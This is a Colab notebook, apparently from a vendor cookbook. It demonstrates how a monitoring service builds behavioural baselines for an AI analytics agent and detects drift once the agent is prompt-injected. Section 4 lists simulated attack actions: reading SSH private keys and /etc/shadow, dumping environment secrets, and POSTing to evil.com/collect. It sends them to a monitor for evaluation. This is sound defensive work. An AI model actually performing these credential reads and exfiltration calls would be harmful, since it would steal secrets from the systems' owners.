[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/othnielObasi/airg-cookbook/blob/main/use_cases/20_fingerprinting_drift.ipynb)

# 🧬 Agent Fingerprinting & Drift — Detecting a Compromised Agent

An analytics agent normally reads CSV files and runs queries. After a prompt injection,
it starts accessing credentials and making HTTP requests. AIRG's fingerprinting engine
detects the behavioural drift and raises alerts.

**What you'll learn:**
- How AIRG builds behavioural baselines per agent
- Drift detection across tool distribution, risk profile, and call velocity
- Real-world: catching a compromised agent before it exfiltrates data

**Setup:** Set `GOVERNOR_API_KEY` in Colab Secrets (🔑 icon) or as an environment variable.

## 1. Install & Configure

In [ ]:
!pip install -q httpx

import os, httpx, time

try:
    from google.colab import userdata
    API_KEY = userdata.get("GOVERNOR_API_KEY")
except Exception:
    API_KEY = os.getenv("GOVERNOR_API_KEY", "YOUR_KEY")

BASE = os.getenv("GOVERNOR_URL", "https://api.airg.nov-tia.com")
headers = {"X-API-Key": API_KEY}
AGENT = "analytics-bot-demo"
print(f"Connected to {BASE}")

## 2. Build Normal Baseline — Analytics Agent

First, simulate 10 normal operations: reading CSVs, running queries, writing reports.

In [ ]:
normal_ops = [
    ("read_file", {"path": "/data/sales_q1.csv"}),
    ("read_file", {"path": "/data/sales_q2.csv"}),
    ("sql_query", {"query": "SELECT region, SUM(revenue) FROM sales GROUP BY region"}),
    ("read_file", {"path": "/data/customers.csv"}),
    ("sql_query", {"query": "SELECT COUNT(*) FROM orders WHERE status='shipped'"}),
    ("write_file", {"path": "/reports/q1_summary.md", "content": "Q1 revenue: $2.3M"}),
    ("read_file", {"path": "/data/inventory.csv"}),
    ("sql_query", {"query": "SELECT product, units_sold FROM products ORDER BY units_sold DESC LIMIT 10"}),
    ("write_file", {"path": "/reports/top_products.md", "content": "Top 10 products..."}),
    ("read_file", {"path": "/data/returns.csv"}),
]

print("Building normal baseline (10 operations)...\n")
for tool, args in normal_ops:
    r = httpx.post(f"{BASE}/actions/evaluate", headers=headers, json={
        "agent_id": AGENT, "tool": tool, "args": args,
    })
    d = r.json()
    print(f"  {tool:15s} -> {d['decision']}  risk={d['risk_score']}")

print("\nNormal baseline established.")

## 3. Check Current Fingerprint

In [ ]:
agents = httpx.get(f"{BASE}/fingerprint/agents", headers=headers).json()

found = [a for a in agents.get("agents", []) if a["agent_id"] == AGENT]
if found:
    a = found[0]
    print(f"Agent: {a['agent_id']}")
    print(f"  Maturity    : {a['maturity']}")
    print(f"  Unique tools: {a['unique_tools']}")
    print(f"  Block rate  : {a['block_rate_pct']}%")
else:
    print("Agent not yet fingerprinted.")

## 4. Simulate Compromise — Anomalous Behaviour

The agent has been prompt-injected and now tries to access SSH keys,
environment variables, and make outbound HTTP requests.

In [ ]:
attack_ops = [
    ("read_file", {"path": "/home/deploy/.ssh/id_rsa"}),
    ("read_file", {"path": "/etc/shadow"}),
    ("shell_exec", {"command": "env | grep -i secret"}),
    ("http_request", {"url": "https://evil.com/collect", "method": "POST"}),
    ("shell_exec", {"command": "cat /proc/self/environ"}),
]

print("Simulating compromised agent (5 anomalous ops)...\n")
for tool, args in attack_ops:
    r = httpx.post(f"{BASE}/actions/evaluate", headers=headers, json={
        "agent_id": AGENT, "tool": tool, "args": args,
    })
    d = r.json()
    icon = "BLOCKED" if d["decision"] == "block" else "FLAGGED"
    print(f"  [{icon}] {tool:15s} -> {d['decision']}  risk={d['risk_score']}")

print("\nAnomalous operations complete.")

## 5. Detect Drift

In [ ]:
drift = httpx.get(f"{BASE}/fingerprint/agents/{AGENT}/drift",
                  headers=headers).json()

print(f"Drift Analysis for {AGENT}")
print("-" * 50)
print(f"  Drift score: {drift['drift_score']}/100")
print(f"  Level      : {drift['drift_level']}")
print(f"  Alert      : {drift['alert']}\n")

dims = drift.get("dimensions", [])
if dims:
    for dim in dims:
        print(f"  [{dim['dimension']}] score={dim['score']}")
        print(f"    {dim['details']}\n")
else:
    print("  No dimensional drift detected yet.")
    print("  Drift detection improves as the agent builds a")
    print("  longer behavioral history over multiple sessions.")

    # Show what the fingerprint does know
    fp = httpx.get(f"{BASE}/fingerprint/agents/{AGENT}",
                   headers=headers).json()
    print(f"\n  Current fingerprint:")
    print(f"    Total evals : {fp.get('total_evaluations', 0)}")
    print(f"    Unique tools: {fp.get('unique_tools', 0)}")
    print(f"    Block rate  : {fp.get('block_rate_pct', 0)}%")


## Summary

| Phase | Tools Used | Risk Level | Drift |
|---|---|---|---|
| **Normal** | read_file, sql_query, write_file | Low (0-30) | Baseline |
| **Compromised** | shell_exec, http_request, /etc/shadow | High (70-100) | Detected |

AIRG fingerprinting catches the behavioural shift even if individual actions might pass — the *pattern* is anomalous.

→ [Full API docs](https://api.airg.nov-tia.com/docs) · [More recipes](https://github.com/othnielObasi/airg-cookbook)